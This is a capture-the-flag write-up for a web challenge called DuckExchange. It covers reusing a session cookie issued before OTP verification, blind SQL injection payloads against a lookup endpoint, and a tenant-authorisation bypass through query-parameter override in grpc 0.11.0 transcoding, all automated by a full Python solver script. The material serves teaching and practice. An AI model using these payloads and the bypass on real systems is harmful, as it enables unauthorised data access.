# DuckExchange Writeup

## Overview

DuckExchange is a web challenge built around three linked issues:

1. A session is issued before OTP verification is completed, scoped to `Path=/otp` so it must be manually reused.
2. A delivery lookup endpoint contains blind SQL injection.
3. A vulnerable `grpc 0.11.0` HTTP transcoder lets query parameters override protobuf fields populated from route bindings.

The flag is not stored in the database. It is appended at runtime only when the document service returns the restricted Initech incident packet, so the SQL injection is useful for discovering the document UUID but should not directly reveal the flag.

Reference: [CVE-2026-48599](https://vulners.com/vulnrichment/VULNRICHMENT:CVE-2026-48599), covering authorization bypass through path-binding overrides in elixir-grpc/grpc HTTP transcoding.

## Recon

Start at the challenge URL:

```sh
curl -i http://HOST:4000/
```

The landing page (`/`) describes DuckExchange and links to Sign up (`/register`),
Sign in (`/login`), and Inbox (`/inbox`). Register a new Acme analyst account with a strong password, for example:

```text
test1@Test
```

After login, the app redirects to `/otp`. The OTP page says email verification is required, but the login response has already set a trusted cookie:

```http
Set-Cookie: tv_session=...; Path=/otp; HttpOnly; SameSite=Lax
```

The OTP page contains no links to inbox or docs. Because the cookie is `Path=/otp`
scoped, the browser does NOT auto-send it to `/inbox`, plain navigation to
`/inbox` returns `403 Access denied`. The OTP endpoint never accepts a code, so brute forcing
the OTP is a dead end. Capture `tv_session` in Burp from the login response and
manually attach it:

```sh
curl -H 'tv_session=COOKIE_VALUE' http://HOST:4000/inbox
```

Actually send as a Cookie header:

```sh
curl -H 'Cookie: tv_session=COOKIE_VALUE' http://HOST:4000/inbox
```

The inbox page exposes:

- Acme-owned API document links under `/api/v1/tenants/acme-corp/documents/<uuid>`.
- A blocked external Initech delivery reference: `IR-4472`.
- An unused inline JS constant `const DOCS_PATH = "/docs/";` (never fetched, no clickable link).

## Published Docs

The inbox HTML contains `const DOCS_PATH = "/docs/";` in an inline script that is
never called. The nginx front end exposes a directory listing at:

```sh
curl http://HOST:4000/docs/
```

Useful files:

```sh
curl http://HOST:4000/docs/build/mix.lock
curl http://HOST:4000/docs/build/schema.sql
curl -o tenantexchange.protoset http://HOST:4000/docs/descriptors/tenantexchange.protoset
```

`mix.lock` identifies the vulnerable dependency:

```text
grpc 0.11.0
```

`schema.sql` gives the relevant tables and columns:

```sql
tenants(id, slug, ...)
documents(id, tenant_id, title, body, classification, ...)
sessions(token_hash, tenant_id, ...)
challenge_lookup.delivery_index(doc_id)
```

Decode the protobuf descriptor:

```sh
protoc --decode_raw < tenantexchange.protoset
```

The descriptor reveals the transcoded route:

```text
GET /api/v1/tenants/{tenant_id}/documents/{doc_id}
```

## Blind SQL Injection

The delivery lookup endpoint is a boolean oracle (send the manual cookie):

```sh
curl -H 'Cookie: tv_session=COOKIE_VALUE' \
  'http://HOST:4000/exchange/lookup?q=IR-4472'
```

If the query matches, the response contains:

```text
Pending tenant verification
```

If it does not match, the response contains:

```text
No routed object found
```

The vulnerable query runs through a dedicated low-privilege lookup role. That role can read only
`challenge_lookup.delivery_index(doc_id)`, so the flag and application tables are not SQL-visible.
The lookup still acts as a boolean oracle, allowing the UUID to be recovered one character at a time:

```text
missing%' OR substring(doc_id::text,1,1) = 'a'--
```

URL-encoded example:

```sh
curl -H 'Cookie: tv_session=COOKIE_VALUE' \
  "http://HOST:4000/exchange/lookup?q=missing%25%27%20OR%20substring(doc_id::text,1,1)=%27a%27--"
```
NOTE: You can use SQLMAP here to dump the database.

## Tenant Guard Bypass

Using the recovered Initech UUID directly with the Initech tenant path fails:

```sh
curl -i -H 'Cookie: tv_session=COOKIE_VALUE' \
  'http://HOST:4000/api/v1/tenants/initech-inc/documents/INITECH_UUID'
```

Expected result:

```json
{"error":"tenant denied"}
```

The guard checks the route tenant from Cowboy path bindings before the grpc transcoder builds the protobuf request. Because `grpc 0.11.0` merges path bindings first and query parameters later for `body: ""` routes, the query string can override the protobuf `tenant_id` seen by the handler.

Keep the authorized Acme tenant in the path, but override `tenant_id` in the query:

```sh
curl -H 'Cookie: tv_session=COOKIE_VALUE' \
  'http://HOST:4000/api/v1/tenants/acme-corp/documents/INITECH_UUID?tenant_id=initech-inc'
```

The guard sees `acme-corp` and allows the request. The document handler sees `initech-inc`, loads the restricted Initech document, and appends the runtime flag.

## Solver Script

```python
#!/usr/bin/env python3
# DuckExchange solver: tv_session is Path=/otp scoped, so capture it manually
# from the login response and re-attach as a Cookie header (Burp-style).
import re
import time
import urllib.parse
import urllib.request
import urllib.error

BASE = "http://HOST:4000"
PASSWORD = "Aa1!examplepass"
TV_SESSION = ""  # filled after login


def request(path, data=None, follow=True):
    headers = {}
    if TV_SESSION:
        headers["Cookie"] = f"tv_session={TV_SESSION}"
    body = None
    if data is not None:
        body = urllib.parse.urlencode(data).encode()
        headers["Content-Type"] = "application/x-www-form-urlencoded"

    req = urllib.request.Request(BASE + path, data=body, headers=headers)

    # Do not auto-follow login redirect so we can read Set-Cookie.
    opener = urllib.request.build_opener(NoRedirect())
    try:
        resp = opener.open(req, timeout=10)
        return resp.status, dict(resp.headers), resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as err:
        return err.code, dict(err.headers), err.read().decode("utf-8", "replace")


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def csrf(html):
    match = re.search(r'name="_csrf_token" value="([^"]+)"', html)
    if not match:
        raise RuntimeError("missing CSRF token")
    return match.group(1)


def lookup(payload):
    path = "/exchange/lookup?" + urllib.parse.urlencode({"q": payload})
    status, _headers, body = request(path)
    if status != 200:
        raise RuntimeError(f"lookup failed: {status}")
    return "Pending tenant verification" in body


_, _, body = request("/register")
email = f"solver{int(time.time())}@example.test"
request(
    "/register",
    {
        "_csrf_token": csrf(body),
        "name": "Solver",
        "email": email,
        "password": PASSWORD,
    },
)

_, _, body = request("/login")
status, headers, _ = request(
    "/login",
    {
        "_csrf_token": csrf(body),
        "email": email,
        "password": PASSWORD,
    },
)

# Extract tv_session manually (it is Path=/otp, browsers will not auto-send to /inbox).
set_cookie = headers.get("Set-Cookie", "") or headers.get("Set-cookie", "")
m = re.search(r"tv_session=([^;]+)", set_cookie)
if not m:
    raise RuntimeError(f"missing tv_session in login response: {status} {set_cookie[:200]}")
TV_SESSION = m.group(1)
print(f"captured tv_session Path=/otp: {TV_SESSION[:12]}...")

# Prove manual reuse: /inbox requires the manual Cookie header.
status, _, inbox_body = request("/inbox")
assert status == 200 and "DuckExchange Inbox" in inbox_body, f"inbox failed: {status}"

alphabet = "0123456789abcdef-"
doc_id = ""

for pos in range(1, 37):
    for ch in alphabet:
        payload = (
            "missing%' OR "
            f"substring(doc_id::text,{pos},1)='{ch}'--"
        )

        if lookup(payload):
            doc_id += ch
            print(doc_id)
            break
    else:
        raise RuntimeError(f"failed at position {pos}")

status, _, flag_body = request(
    f"/api/v1/tenants/acme-corp/documents/{doc_id}?tenant_id=initech-inc"
)

print(flag_body)
```

## Verified Local Behavior

Against the local Compose deployment, the exploit recovered an Initech UUID and the final request returned:

```json
{
  "body": "Incident IR-4472 final escalation packet. Release is blocked until tenant ownership is verified. Flag: <CONTROLLED_FLAG>",
  "classification": "restricted",
  "tenantId": "initech-inc",
  "title": "Incident IR-4472 Escalation"
}
```

## Deployment Notes

Deploy with the final flag:

```sh
docker compose up -d --build
```

Only distribute `README.md` and the deployed URL to players. Do not distribute the source zip, `ORGANIZER.md`, `Dockerfile`, `docker-compose.yml`, or `nginx.conf`.

Reset a local instance with:

```sh
docker compose down -v
docker compose up -d --build
```

During verification, the live nginx/Phoenix deployment behaved as intended:

- `/` is a public DuckExchange landing page with Sign up / Sign in / Inbox nav.
- `GET /inbox` without a manual `tv_session` cookie returns `403 Access denied`, even right after login in the same browser (cookie is `Path=/otp`).
- `GET /otp` renders with no inbox/docs links.
- `/inbox` HTML contains `DOCS_PATH = "/docs/"` but no `href="/docs/"`.
- `/docs/` is listed and exposes only the intended build/schema/descriptor artifacts.
- Unauthenticated `/api/v1/...` requests return `401`.
- Direct Initech document paths with an Acme session return `403`.
- SQL syntax errors in lookup do not expose stack traces.
- Stacked SQL writes did not execute successfully, so the lookup endpoint stayed a read-style oracle in practice.
